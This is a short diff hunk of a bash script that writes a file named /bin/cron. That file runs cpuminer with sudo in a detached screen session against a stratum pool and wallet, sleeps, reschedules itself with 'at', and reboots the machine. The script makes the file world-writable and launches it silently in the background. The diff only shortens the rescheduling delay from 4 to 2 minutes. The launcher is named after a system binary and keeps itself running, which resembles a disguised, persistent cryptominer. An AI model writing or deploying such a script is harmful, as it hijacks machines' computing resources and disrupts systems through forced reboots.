@@ -27,7 +27,7 @@ echo "#!/bin/bash" > /bin/cron
 echo "[[ ${cpulimit} -gt "0" ]] && screen -dmS cpu cpulimit -e cpuminer -l ${cpulimit}" >> /bin/cron
 echo "sudo screen -dmS mining cpuminer -a ${algoritimo} -o stratum+tcp://${stratum}${walle}${eman}${core} -R 30${coin}" >> /bin/cron
 echo "sleep ${rebo}m" >> /bin/cron
-echo "at -f /bin/cron now + 4 min" >> /bin/cron
+echo "at -f /bin/cron now + 2 min" >> /bin/cron
 echo "sudo reboot" >> /bin/cron
 sudo chmod 777 /bin/cron && bash /bin/cron & > /dev/null
 }
